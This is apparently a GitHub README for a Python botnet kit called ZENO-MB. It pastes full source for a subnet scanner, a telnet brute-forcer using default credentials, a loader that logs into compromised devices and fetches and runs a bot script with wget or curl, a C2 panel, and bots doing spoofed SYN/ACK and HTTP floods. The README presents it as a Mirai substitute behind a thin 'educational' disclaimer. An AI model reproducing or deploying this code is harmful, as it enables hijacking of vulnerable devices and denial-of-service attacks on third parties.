![Screenshot](https://github.com/rifqi409/ZENO-MB-REAL/raw/main/file_000000006dc061f4bdda807a67c46304.png)
https://github.com/rifqi409/ZENO-MB-REAL.git

⚠️ DISCLAIMER: This project is for ethical hacking & cybersecurity education. Do not use it for unauthorized access or attacks. Every action you take is your responsibility.
# ZENO-MB: Master Control Hub (by FM)

Welcome to **ZENO-MB**, an advanced multi-function C2 (Command & Control) botnet control hub built for educational purposes. Created by **FM (Front Man)**, this tool is designed to provide a powerful yet simple interface to manage your botnet operations inside a Termux/Linux environment.

🔧 **What is ZENO-MB?**  
ZENO-MB is a Python-based C2 (Command & Control) panel that allows you to:
- Scan for vulnerable IPs  
- Perform brute force login attempts  
- Send payloads or droppers to bots  
- Join remote bots to your C2  
- Monitor and control connected bots  
- Launch coordinated attacks

🧠 **Components**
1. `bot.py` → This is the server-side bot listener. It must be running to receive instructions.
2. `ZENO-MB.py` → This is the control panel used to send commands to the bots.

# ZENO-MB: Master Control Hub (by FM)

Welcome to **ZENO-MB**, an advanced multi-function C2 (Command & Control) botnet control hub built for educational purposes. Created by **FM (Front Man)**, this tool is designed to provide a powerful yet simple interface to manage your botnet operations inside a Termux/Linux environment.

screenshot 
![Screenshot](https://github.com/rifqi409/ZENO-MB-REAL/raw/main/Screenshot_2025-07-25-22-00-55-01.jpg)

🔧 **What is ZENO-MB?**  
ZENO-MB is a Python-based C2 (Command & Control) panel that allows you to:
- Scan for vulnerable IPs  
- Perform brute force login attempts  
- Send payloads or droppers to bots  
- Join remote bots to your C2  
- Monitor and control connected bots  
- Launch coordinated attacks

🧠 **Components**
1. `bot.py` → This is the server-side bot listener. It must be running to receive instructions.
2. `ZENO-MB.py` → This is the control panel used to send commands to the bots.

---

🚀 How to Run ZENO-MB

Step 1: Start the Bot Listener
Buka Tab 1 di Termux atau terminal kamu:

python bot.py

Akan muncul pesan seperti:
Bot online di port 8080... Siap
* Running on http://127.0.0.1:8080

> Jangan exit/run ini jika ingin bot tetap hidup!



Step 2: Open the Control Panel
Geser ke kanan untuk buka Tab 2 (session baru), lalu jalankan:

python3 ZENO-MB.py

Maka akan muncul menu:

🔥 ZENO-MB: MASTER CONTROL HUB 🔥
[1] Scanner IP Rentan
[2] Brute Forcer Login
[3] Loader Dropper Bot
[4] Join Bot ke C2
[5] Pantau & Kontrol C2 Panel
[6] Launch Attack

⚠️ Disclaimer:
This tool is built for educational purposes only

— Developed with 🔥 by FM (Front Man)

I'M ANGRY!!
Github doesn't allow Mirai Botnet, so if that's what you want, you can make your own below.

created by : FrontMan
in group : Hacker Dedic Network cyber force 


-------------------
nano scanner.py ⬇️👇🏻
-------------------

import socket
import concurrent.futures
import time

COMMON_PORTS = [22, 23, 80, 443, 8080, 2323]

def is_open(ip, port):
    try:
        with socket.socket() as s:
            s.settimeout(1)
            s.connect((ip, port))
            return True
    except:
        return False

def scan_ip(ip):
    open_ports = []
    for port in COMMON_PORTS:
        if is_open(ip, port):
            open_ports.append(port)
    return ip, open_ports

def run_scanner():
    print("[INFO] Memulai auto-scan IP dalam jaringan 192.168.1.1 - 254...")
    time.sleep(1)

    targets = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        ip_range = [f"192.168.1.{i}" for i in range(1, 255)]
        results = executor.map(scan_ip, ip_range)

    for ip, ports in results:
        if ports:
            for port in ports:
                print(f"[OPEN] {ip}:{port}")
                targets.append(f"{ip}:{port}")

    if targets:
        with open("targets.txt", "w") as f:
            for t in targets:
                f.write(t + "\n")
        print(f"\n[✓] Target rentan disimpan di targets.txt")
    else:
        print("\n[!] Tidak ditemukan target terbuka!")

    input("\n[ENTER] kembali ke menu...")

--------------------
nano brute.py ⬇️👇🏻
--------------------

import telnetlib
import socket
from concurrent.futures import ThreadPoolExecutor

# Kombinasi username/password umum
CREDENTIALS = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "admin"),
    ("admin", "1234"),
    ("user", "user"),
    ("support", "support"),
    ("admin", "password"),
]

def try_login(ip, timeout=5):
    for user, passwd in CREDENTIALS:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout)
            tn.read_until(b"login:", timeout=2)
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=2)
            tn.write(passwd.encode('ascii') + b"\n")
            index, match, output = tn.expect([b"#", b">", b"$"], timeout=3)
            if index >= 0:
                print(f"[OK] {ip} login berhasil sebagai {user}/{passwd}")
                return (ip, user, passwd)
        except:
            continue
    return None

def run_brute():
    try:
        with open("targets.txt", "r") as f:
            lines = f.read().splitlines()
        target_ips = [line.split(":")[0] for line in lines if ":23" in line or ":2323" >
    except:
        print("[!] Gagal membaca targets.txt")
        return

    if not target_ips:
        print("[!] Tidak ada target IP dengan port 23 ditemukan.")
        return

    print(f"[*] Mulai brute force pada {len(target_ips)} IP...")

    results = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(try_login, ip) for ip in target_ips]
        for future in futures:
            res = future.result()
            if res:
                results.append(res)

    if results:
        with open("bots.txt", "w") as f:
            for ip, user, passwd in results:
                f.write(f"http://{ip}:80\n")  # Bisa diganti sesuai port command bot ka>
        print(f"[✓] {len(results)} login berhasil. Disimpan ke bots.txt")
    else:
        print("[X] Tidak ditemukan login valid.")

----------------
nano loader.py ⬇️👇🏻
----------------

import telnetlib
import time
import os

def inject_bot(ip, user, passwd, bot_script_url):
    try:
        print(f"[LOADER] Menyambung ke {ip} sebagai {user}/{passwd}")
        tn = telnetlib.Telnet(ip, 23, timeout=5)
        tn.read_until(b"login:")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password:")
        tn.write(passwd.encode('ascii') + b"\n")

        index, match, output = tn.expect([b"#", b">", b"$"], timeout=3)
        if index < 0:
            print(f"[!] Gagal shell akses ke {ip}")
            return False

        commands = [
            f"wget {bot_script_url} -O /tmp/bot.py || curl -o /tmp/bot.py {bot_script_u>
            "chmod +x /tmp/bot.py",
            "nohup python3 /tmp/bot.py &"
        ]

        for cmd in commands:
            tn.write(cmd.encode('ascii') + b"\n")
            time.sleep(1)

        tn.write(b"exit\n")
        print(f"[✓] Bot berhasil dikirim ke {ip}")
        return True

    except Exception as e:
        print(f"[X] Error saat kirim ke {ip}: {e}")
        return False

def run_loader():
    if not os.path.exists("brute_results.txt"):
        print("[!] File brute_results.txt tidak ditemukan.")
        return

    with open("brute_results.txt", "r") as f:
        lines = f.read().splitlines()

    brute_results = []
    for line in lines:
        try:
            ip, user, passwd = line.split("|")
            brute_results.append((ip, user, passwd))
        except:
            continue

    if not brute_results:
        print("[!] Tidak ada data valid di brute_results.txt")
        return

    bot_script_url = input("[URL] Masukkan link bot script (misal: http://yourhost/bot.>

    for ip, user, passwd in brute_results:
        inject_bot(ip, user, passwd, bot_script_url)

    print("[✓] Semua bot berhasil dikirim.")

------------------
nano botjoin.py ⬇️👇🏻
------------------

import requests
from colorama import Fore

def run_botjoin():
    print(Fore.YELLOW + "\n[JOIN] Menghubungkan semua bot hasil inject ke C2...")

    try:
        with open("brute_results.txt", "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "[X] File brute_results.txt tidak ditemukan!")
        return []

    bots = []

    for line in lines:
        try:
            ip, user, passwd = line.strip().split("|")
        except:
            continue

        try:
            # Default C2 Port bot = 80, endpoint '/ping' untuk cek
            url = f"http://{ip}/ping"
            r = requests.get(url, timeout=3)

            if r.status_code == 200 and "pong" in r.text.lower():
                bots.append(ip)
                print(Fore.GREEN + f"[✓] Bot aktif di {ip}")
            else:
                print(Fore.MAGENTA + f"[!] Tidak merespon dari {ip}")
        except:
            print(Fore.RED + f"[X] Gagal ping ke {ip}")

    if bots:
        with open("bots.txt", "w") as f:
            for b in bots:
                f.write(b + "\n")
        print(Fore.CYAN + f"[✓] {len(bots)} bot aktif, disimpan ke bots.txt ✔")
    else:
        print(Fore.RED + "[!] Tidak ada bot aktif ditemukan.")

    return bots

----------------
nano c2panel.py ⬇️👇🏻
----------------

import requests
from colorama import Fore
import os

def run_c2panel():
    if not os.path.exists("bots.txt"):
        print(Fore.RED + "[X] File bots.txt tidak ditemukan. Jalankan bot join terlebih>
        return

    with open("bots.txt", "r") as f:
        bots = [line.strip().replace("http://", "").replace(":80", "") for line in f.re>

    if not bots:
        print(Fore.RED + "[X] Tidak ada bot aktif di bots.txt.")
        return

    while True:
        print(Fore.YELLOW + "\n[CONTROL PANEL] Kirim perintah ke semua bot:\n")
        print(Fore.CYAN + "[1] Cek Status Bot (Ping)")
        print(Fore.CYAN + "[2] Jalankan Attack Test")
        print(Fore.CYAN + "[3] Bersihkan Bot (Shutdown Endpoint)")
        print(Fore.CYAN + "[0] Kembali\n")

        opsi = input("Pilih perintah: ")

        if opsi == "1":
            for bot in bots:
                try:
                    r = requests.get(f"http://{bot}/ping", timeout=3)
                    if "pong" in r.text.lower():
                        print(Fore.GREEN + f"[✓] Bot {bot} responsif")
                    else:
                        print(Fore.MAGENTA + f"[!] Bot {bot} tidak valid")
                except:
                    print(Fore.RED + f"[X] Gagal ping {bot}")

        elif opsi == "2":
            target = input("Target IP/Domain: ")
            port = input("Target Port: ")

            for bot in bots:
                try:
                    url = f"http://{bot}/attack?target={target}&port={port}"
                    r = requests.get(url, timeout=5)
                    print(Fore.GREEN + f"[C2] Perintah dikirim ke {bot}: {r.status_code>
                except:
                    print(Fore.RED + f"[X] Gagal mengirim ke {bot}")

        elif opsi == "3":
            for bot in bots:
                try:
                    r = requests.get(f"http://{bot}/shutdown", timeout=3)
                    print(Fore.YELLOW + f"[!] Shutdown dikirim ke {bot}: {r.status_code>
                except:
                    print(Fore.RED + f"[X] Gagal shutdown {bot}")

        elif opsi == "0":
            print(Fore.CYAN + "[•] Kembali ke menu utama...")
            break

        else:
            print(Fore.RED + "[!] Pilihan tidak valid!")

------------------
nano attacker.py ⬇️👇🏻
------------------

import os
import time
import threading
import random
import requests
from scapy.all import IP, TCP, send
from colorama import Fore, init

init(autoreset=True)

def run_attack_mode():
    os.system("clear")
    print(f"""{Fore.RED}
╔═══════════════════════════════════════════════╗
║       🔥 ZENO-MB ULTIMATE ATTACK MODE 🔥      ║
║        HDN Cyber Forces | RIFQI SYSTEM       ║
╠═══════════════════════════════════════════════╣
║      L3 + L4 + L7 | Real Attack + BotNet      ║
╚═══════════════════════════════════════════════╝
""")

    target = input(Fore.YELLOW + "[?] Masukkan IP/Domain target: ")
    port = int(input(Fore.YELLOW + "[?] Masukkan port (80/443/22/8080): "))
    thread_count = int(input(Fore.YELLOW + "[?] Jumlah thread lokal: "))

    # Load bot dari file
    try:
        with open("bots.txt", "r") as f:
            bots = [line.strip().replace("http://", "").replace(":80", "") for line in f.readlines()]
        print(Fore.GREEN + f"[✓] {len(bots)} bot siap dari bots.txt")
    except:
        bots = []
        print(Fore.RED + "[X] Gagal baca bots.txt, lanjut tanpa botnet")

    # Load proxy
    try:
        with open("proxy.txt", "r") as f:
            proxies = f.read().splitlines()
    except:
        proxies = []

    user_agents = [
        "Mozilla/5.0", "curl/7.64.1", "Wget/1.20.3",
        "python-requests/2.25.1", "Go-http-client/1.1"
    ]

    # L3/L4 - SYN Flood
    def syn_flood():
        while True:
            ip_packet = IP(
                src=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                dst=target
            )
            tcp_packet = TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="S"
            )
            send(ip_packet/tcp_packet, verbose=0)

    # L7 - HTTP Flood
    def http_flood():
        while True:
            proxy = random.choice(proxies) if proxies else None
            proxy_dict = {"http": proxy, "https": proxy} if proxy else None
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "Connection": "keep-alive"
            }
            try:
                r = requests.get(f"http://{target}:{port}", headers=headers, proxies=proxy_dict, timeout=3)
                print(Fore.GREEN + f"[L7] {r.status_code} dari {proxy or 'LOCAL'}")
            except:
                print(Fore.RED + "[!] HTTP/Proxy gagal atau timeout")

    # Trigger Botnet
    def remote_trigger():
        for bot_ip in bots:
            try:
                r = requests.get(f"http://{bot_ip}/attack?target={target}&port={port}", timeout=3)
                print(Fore.YELLOW + f"[C2] Bot {bot_ip} respon: {r.status_code}")
            except:
                print(Fore.MAGENTA + f"[!] Bot {bot_ip} tidak responsif")

    # Start Threads
    for _ in range(thread_count):
        threading.Thread(target=syn_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()

    threading.Thread(target=remote_trigger, daemon=True).start()

    print(Fore.CYAN + f"\n[✓] Serangan dimulai ke {target}:{port} "
                      f"dengan {thread_count*2} thread lokal + {len(bots)} bot remote\n")
    print(Fore.RED + "[!] Tekan CTRL+C untuk hentikan\n")

    while True:
        time.sleep(1)

----------------
nano ZENO-MB.py ⬇️👇🏻
----------------

import os
import time
from colorama import Fore, init

from brute import run_brute
from loader import run_loader
from botjoin import run_botjoin
from c2panel import run_c2panel
from attacker import run_attack_mode

init(autoreset=True)

BANNER = f"""{Fore.RED}
╔═══════════════════════════════════════════════╗                                                               ║        🔥 ZENO-MB: MASTER CONTROL HUB 🔥      ║
║          HDN Cyber Forces | by FrontMan       ║
╠═══════════════════════════════════════════════╣
║ [1] vulnerable iP scanner 🌐                  ║
║ [2] Brute Forcer Login 🔓                     ║
║ [3] Loader Dropper Bot 📦                     ║
║ [4] bot join c2 🤖                            ║
║ [5] monitor & control c2 panel 🧠             ║
║ [6] Launch Attack  🔥                         ║
║ [0] Exit  ❌                                  ║
╚═══════════════════════════════════════════════╝
"""

while True:
    os.system("clear")
    print(BANNER)
    pilihan = input(Fore.CYAN + "Pilih menu: ")

    if pilihan == "1":
        run_scanner()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "2":
        run_brute()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "3":
        run_loader()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "4":
        run_botjoin()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "5":
        run_c2panel()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "6":
        run_attack_mode()
        input(Fore.YELLOW + "\n[ENTER] untuk kembali ke menu...")

    elif pilihan == "0":
        print(Fore.MAGENTA + "\nKeluar dari ZENO-MB... Sampai jumpa.")
        break

    else:
        print(Fore.RED + "[!] Pilihan tidak valid!")
        time.sleep(1)
--------------------
nano bot.py ⬇️👇🏻
--------------------

from flask import Flask, request
import threading
import random
import time
from scapy.all import IP, TCP, send

app = Flask(__name__)

@app.route('/attack')
def attack():
    target = request.args.get('target')
    port = int(request.args.get('port', 80))
    mode = request.args.get('mode', 'syn')  # syn / ack / mixed

    def syn_flood():
        while True:
            pkt = IP(
                dst=target,
                src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ) / TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="S"
            )
            send(pkt, verbose=0)
            time.sleep(random.uniform(0.01, 0.05))

    def ack_flood():
        while True:
            pkt = IP(
                dst=target,
                src=f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ) / TCP(
                sport=random.randint(1024,65535),
                dport=port,
                flags="A"
            )
            send(pkt, verbose=0)
            time.sleep(random.uniform(0.01, 0.05))

    # Jalankan thread flood berdasarkan mode
    if mode == "syn":
        for _ in range(3):
            threading.Thread(target=syn_flood, daemon=True).start()
    elif mode == "ack":
        for _ in range(3):
            threading.Thread(target=ack_flood, daemon=True).start()                                                                               elif mode == "mixed":
        for _ in range(2):                                                                                                                                threading.Thread(target=syn_flood, daemon=True).start()
            threading.Thread(target=ack_flood, daemon=True).start()
    else:
        return "[!] Mode tidak valid!", 400

    return f"[✓] Bot serang {target}:{port} mode={mode}", 200

@app.route('/ping')
def ping():
    return "pong", 200

@app.route('/shutdown')
def shutdown():
    shutdown_msg = "[✓] Bot shutdown perintah diterima"
    shutdown_func = request.environ.get('werkzeug.server.shutdown')
    if shutdown_func:
        shutdown_func()
    return shutdown_msg, 200

if __name__ == '__main__':
    print("Bot online di port 8080... Siap menerima perintah C2")
    app.run(host='0.0.0.0', port=8080)
